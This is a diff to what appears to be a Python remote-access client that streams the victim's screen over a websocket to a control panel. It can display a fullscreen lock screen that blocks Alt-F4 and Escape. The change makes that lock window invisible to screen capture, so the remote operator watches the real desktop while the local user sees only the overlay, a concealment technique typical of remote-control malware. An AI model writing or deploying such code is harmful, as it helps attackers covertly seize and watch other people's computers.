@@ -35,7 +35,6 @@ ws_app = None
 running = True
 screen_locked = False
 lock_thread = None
-last_frame_before_lock = None
 
 
 def set_console_title(title):
@@ -165,6 +164,15 @@ def show_lock_screen(message):
             root.bind('<Alt-F4>', lambda e: 'break')
             root.bind('<Escape>', lambda e: 'break')
 
+            # Tornar janela INVISÍVEL para capturas de tela (Windows 10 2004+)
+            root.update()
+            try:
+                hwnd = ctypes.windll.user32.GetParent(root.winfo_id())
+                WDA_EXCLUDEFROMCAPTURE = 0x00000011
+                ctypes.windll.user32.SetWindowDisplayAffinity(hwnd, WDA_EXCLUDEFROMCAPTURE)
+            except:
+                pass
+
             frame = tk.Frame(root, bg='#000000')
             frame.place(relx=0.5, rely=0.5, anchor='center')
 
@@ -208,7 +216,7 @@ def hide_lock_screen():
 # ============================================
 
 def capture_screen():
-    global panel_connected, running, current_quality, current_scale, last_frame_before_lock
+    global panel_connected, running, current_quality, current_scale
 
     with mss.mss() as sct:
         monitor = sct.monitors[1]
@@ -219,13 +227,6 @@ def capture_screen():
                 continue
 
             try:
-                # Se tela bloqueada, enviar último frame salvo
-                if screen_locked and last_frame_before_lock:
-                    if ws_app and is_connected:
-                        ws_app.send(json.dumps(last_frame_before_lock))
-                    time.sleep(FRAME_INTERVAL)
-                    continue
-
                 screenshot = sct.grab(monitor)
                 img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
 
@@ -237,22 +238,17 @@ def capture_screen():
                 img.save(buffer, format='JPEG', quality=current_quality, optimize=True)
                 frame_data = base64.b64encode(buffer.getvalue()).decode('utf-8')
 
-                frame_msg = {
-                    "type": "screen-frame",
-                    "clientId": client_id,
-                    "frame": frame_data,
-                    "width": img.width,
-                    "height": img.height
-                }
-
-                # Salvar frame para usar quando bloqueado
-                last_frame_before_lock = frame_msg
-
                 if ws_app and is_connected:
-                    ws_app.send(json.dumps(frame_msg))
+                    ws_app.send(json.dumps({
+                        "type": "screen-frame",
+                        "clientId": client_id,
+                        "frame": frame_data,
+                        "width": img.width,
+                        "height": img.height
+                    }))
 
                 time.sleep(FRAME_INTERVAL)
-            except Exception as e:
+            except:
                 time.sleep(1)
 
 
